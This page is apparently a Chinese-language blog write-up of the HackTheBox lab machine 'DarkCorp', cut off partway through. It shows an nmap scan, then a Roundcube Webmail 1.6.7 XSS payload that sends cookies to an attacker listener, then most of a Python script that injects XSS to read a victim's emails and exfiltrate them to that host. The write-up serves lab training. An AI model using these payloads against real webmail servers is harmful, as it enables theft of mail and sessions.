<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>DarkCorp - HackTheBox | 喵喵喵喵 | 愚かな人間</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#66CCFF">
    
    
    <meta name="keywords" content="HackTheBox">
    <meta name="description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines 10.10.11.54                                                                                                              端口扫描22和80: 1234567891011121314151617$">
<meta property="og:type" content="article">
<meta property="og:title" content="DarkCorp - HackTheBox">
<meta property="og:url" content="https://darkwing.moe/2025/02/10/DarkCorp-HackTheBox/index.html">
<meta property="og:site_name" content="喵喵喵喵">
<meta property="og:description" content="基本信息 https:&#x2F;&#x2F;app.hackthebox.com&#x2F;machines 10.10.11.54                                                                                                              端口扫描22和80: 1234567891011121314151617$">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021001.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021002.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021003.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021004.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021005.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021006.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021007.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021008.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021009.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021010.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021011.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021012.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021013.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021014.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021015.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021016.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021017.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021018.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021019.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021020.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021021.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021022.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021023.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021024.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021025.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021026.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021027.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021031.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021032.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021033.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021034.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021035.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021036.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021037.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021038.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021039.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021040.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021041.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021042.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021028.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021029.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021030.jpg">
<meta property="article:published_time" content="2025-02-10T10:52:07.000Z">
<meta property="article:modified_time" content="2025-10-23T10:50:04.466Z">
<meta property="article:author" content="暗羽">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021001.jpg">
    
        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

<meta name="generator" content="Hexo 4.2.0"></head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/avatar.jpg">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">暗羽</h5>
          <a href="mailto:Discord@darkwing_nya" title="Discord@darkwing_nya" class="mail">Discord@darkwing_nya</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/zjicmDarkWing" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://twitter.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-gratipay"></i>
                Twitter
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://www.buymeacoffee.com/darkwing_nya" target="_blank" >
                <i class="icon icon-lg icon-coffee"></i>
                Buy me a coffee
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://darkwing.moe/2015/01/01/about/"  >
                <i class="icon icon-lg icon-link"></i>
                About
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">DarkCorp - HackTheBox</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">DarkCorp - HackTheBox</h1>
        <h5 class="subtitle">
            
                <time datetime="2025-02-10T10:52:07.000Z" itemprop="datePublished" class="page-time">
  2025-02-10
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基本信息"><span class="post-toc-number">1.</span> <span class="post-toc-text">基本信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#端口扫描"><span class="post-toc-number">2.</span> <span class="post-toc-text">端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#80"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">80</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Roundcube-Webmail"><span class="post-toc-number">3.</span> <span class="post-toc-text">Roundcube Webmail</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#contact"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">contact</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#bcase-xss"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">bcase xss</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#oswe-time"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">oswe time</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#dev-a3f1-01-drip-htb"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">dev-a3f1-01.drip.htb</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#mail-xss-py"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">mail_xss.py</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#dev-a3f1-01"><span class="post-toc-number">4.</span> <span class="post-toc-text">dev-a3f1-01</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql注入"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">sql注入</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql-to-rce"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">sql to rce</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#postgres"><span class="post-toc-number">5.</span> <span class="post-toc-text">postgres</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#gpg"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">gpg</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ebelford"><span class="post-toc-number">6.</span> <span class="post-toc-text">ebelford</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#bloodhound"><span class="post-toc-number">7.</span> <span class="post-toc-text">bloodhound</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#users"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">users</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#内网端口扫描"><span class="post-toc-number">8.</span> <span class="post-toc-text">内网端口扫描</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#20-1"><span class="post-toc-number">8.1.</span> <span class="post-toc-text">20.1</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#20-2"><span class="post-toc-number">8.2.</span> <span class="post-toc-text">20.2</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Internal-Status-Monitor"><span class="post-toc-number">9.</span> <span class="post-toc-text">Internal Status Monitor</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#check"><span class="post-toc-number">9.1.</span> <span class="post-toc-text">check</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#svc-acc"><span class="post-toc-number">9.2.</span> <span class="post-toc-text">svc_acc</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Relay-time"><span class="post-toc-number">10.</span> <span class="post-toc-text">Relay time</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#非预期"><span class="post-toc-number">10.1.</span> <span class="post-toc-text">非预期</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web-01-amp-user-flag"><span class="post-toc-number">10.2.</span> <span class="post-toc-text">web-01 &amp; user flag</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web-01-hashdump"><span class="post-toc-number">10.3.</span> <span class="post-toc-text">web-01 hashdump</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web-01-dpapi"><span class="post-toc-number">10.4.</span> <span class="post-toc-text">web-01 dpapi</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#john-w"><span class="post-toc-number">11.</span> <span class="post-toc-text">john.w</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#angela-w"><span class="post-toc-number">11.1.</span> <span class="post-toc-text">angela.w</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Linux-Admins"><span class="post-toc-number">12.</span> <span class="post-toc-text">Linux_Admins</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#angela-w-adm"><span class="post-toc-number">12.1.</span> <span class="post-toc-text">angela.w.adm</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#etc-krb5-conf"><span class="post-toc-number">12.2.</span> <span class="post-toc-text">&#x2F;etc&#x2F;krb5.conf</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#sssd"><span class="post-toc-number">13.</span> <span class="post-toc-text">sssd</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#taylor-b-adm-to-root"><span class="post-toc-number">14.</span> <span class="post-toc-text">taylor.b.adm to root</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#gpo-abuse"><span class="post-toc-number">14.1.</span> <span class="post-toc-text">gpo abuse</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#root-flag"><span class="post-toc-number">15.</span> <span class="post-toc-text">root flag</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#hashdump"><span class="post-toc-number">15.1.</span> <span class="post-toc-text">hashdump</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#参考资料"><span class="post-toc-number">16.</span> <span class="post-toc-text">参考资料</span></a></li></ol>
        </nav>
    </aside>


<article id="post-DarkCorp-HackTheBox"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">DarkCorp - HackTheBox</h1>
        <div class="post-meta">
            <time class="post-time" title="2025-02-10 18:52:07" datetime="2025-02-10T10:52:07.000Z"  itemprop="datePublished">2025-02-10</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><ul>
<li><a href="https://app.hackthebox.com/machines" target="_blank" rel="noopener">https://app.hackthebox.com/machines</a></li>
<li>10.10.11.54</li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021001.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>22和80:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> nmap -sC -sV -Pn 10.10.11.54</span></span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-10 13:30 CST</span><br><span class="line">Nmap scan report for 10.10.11.54</span><br><span class="line">Host is up (0.23s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   256 33:41:ed:0a:a5:1a:86:d0:cc:2a:a6:2b:8d:8d:b2:ad (ECDSA)</span><br><span class="line">|_  256 04:ad:7e:ba:11:0e:e0:fb:d0:80:d3:24:c2:3e:2c:c5 (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.22.1</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">|_http-server-header: nginx/1.22.1</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 139.27 seconds</span><br></pre></td></tr></table></figure>



<h2 id="80"><a href="#80" class="headerlink" title="80"></a>80</h2><p>需要加hosts：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.11.54 drip.htb</span><br></pre></td></tr></table></figure>

<p>是DripMail，根据页面信息知道用的是Roundcube：</p>
<ul>
<li>roundcube/roundcubemail: The Roundcube Webmail suite<br><a href="https://github.com/roundcube/roundcubemail" target="_blank" rel="noopener">https://github.com/roundcube/roundcubemail</a></li>
</ul>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021002.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="Roundcube-Webmail"><a href="#Roundcube-Webmail" class="headerlink" title="Roundcube Webmail"></a>Roundcube Webmail</h1><p>注册登录，登录是mail子域名也加hosts,可以看到是Roundcube Webmail 1.6.7：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021003.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>搜索可以发现相关漏洞：</p>
<ul>
<li>Government Emails at Risk: Critical Cross-Site Scripting Vulnerability in Roundcube Webmail | Sonar<br><a href="https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/" target="_blank" rel="noopener">https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/</a></li>
</ul>
<h2 id="contact"><a href="#contact" class="headerlink" title="contact"></a>contact</h2><p>是一个XSS漏洞，也就是需要有人阅读邮件才会触发，我们现在有邮箱账号但并没有收件人信息，回到主站，contact us那里可以发邮件，应该会有bot自动查看：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021004.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>这里发送的recipient是support，可以修改为我们自己的邮箱,然后可以看到自动附加的邮件签名：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021005.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="bcase-xss"><a href="#bcase-xss" class="headerlink" title="bcase xss"></a>bcase xss</h2><p>现在得到了目标用户应该是bcase，那就是xss部分了，还是contact那里发邮件，把recipient修改为bcase，并且可以看到content是text，改成html，payload url编码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body title&#x3D;&quot;bgcolor&#x3D;foo&quot; name&#x3D;&quot;bar style&#x3D;animation-name:progress-bar-stripes onanimationstart&#x3D;document.body.appendChild(Object.assign(document.createElement(&#39;script&#39;),&#123;src:&#39;http:&#x2F;&#x2F;10.10.14.8:7777&#x2F;?c&#x3D;&#39;+document.cookie&#125;)) foo&#x3D;bar&quot;&gt;Foo&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021006.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>可以看到callback，但因为cookie是http only，所以没那么简单</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021007.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="oswe-time"><a href="#oswe-time" class="headerlink" title="oswe time"></a>oswe time</h2><p>接下来就是oswe时间了，和课程模块Atmail Mail Server Appliance: from XSS to RCE里的案例很像，只是这个是http only，XSS读邮件,在id为2的邮件中发现Analytics dashboard，并且其中提到需要重置密码才能登录：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dev-a3f1-01.drip.htb</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021008.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="dev-a3f1-01-drip-htb"><a href="#dev-a3f1-01-drip-htb" class="headerlink" title="dev-a3f1-01.drip.htb"></a>dev-a3f1-01.drip.htb</h2><p>所以就是请求重置密码，xss读取邮件得到reset link，重置后登录</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021009.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021010.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2025/master/2025021011.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="mail-xss-py"><a href="#mail-xss-py" class="headerlink" title="mail_xss.py"></a>mail_xss.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Configuration</span></span><br><span class="line">TARGET_URL = <span class="string">'http://drip.htb/contact'</span></span><br><span class="line">LISTEN_PORT = <span class="number">7777</span></span><br><span class="line">LISTEN_IP = <span class="string">'0.0.0.0'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload for the POST request</span></span><br><span class="line">start_mesg = <span class="string">'&lt;body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=fetch(\'/?_task=mail&amp;_action=show&amp;_uid='</span></span><br><span class="line">message = <span class="number">3</span></span><br><span class="line">end_mesg = <span class="string">'&amp;_mbox=INBOX&amp;_extwin=1\').then(r=&gt;r.text()).then(t=&gt;fetch(`http://10.10.14.8:7777/c=$&#123;btoa(t)&#125;`)) foo=bar"&gt;Foo&lt;/body&gt;'</span></span><br><span class="line"></span><br><span class="line">post_data = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'miao'</span>,</span><br><span class="line">    <span class="string">'email'</span>: <span class="string">'miao'</span>,</span><br><span class="line">    <span class="string">'message'</span>: <span class="string">f"<span class="subst">&#123;start_mesg&#125;</span><span class="subst">&#123;message&#125;</span><span class="subst">&#123;end_mesg&#125;</span>"</span>,</span><br><span class="line">    <span class="string">'content'</span>: <span class="string">'html'</span>,</span><br><span class="line">    <span class="string">'recipient'</span>: <span class="string">'bcase@drip.htb'</span></span><br><span class="line">&#125;</span><br><span class="line">print(<span class="string">f"<span class="subst">&#123;start_mesg&#125;</span><span class="subst">&#123;message&#125;</span><span class="subst">&#123;end_mesg&#125;</span>"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Headers for the POST request</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Host'</span>: <span class="string">'drip.htb'</span>,</span><br><span class="line">    <span class="string">'Cache-Control'</span>: <span class="string">'max-age=0'</span>,</span><br><span class="line">    <span class="string">'Upgrade-Insecure-Requests'</span>: <span class="string">'1'</span>,</span><br><span class="line">    <span class="string">'Origin'</span>: <span class="string">'http://drip.htb'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span>,</span><br><span class="line">    <span class="string">'Referer'</span>: <span class="string">'http://drip.htb/index'</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate, br'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'en-US,en;q=0.9'</span>,</span><br><span class="line">    <span class="string">'Cookie'</span>: <span 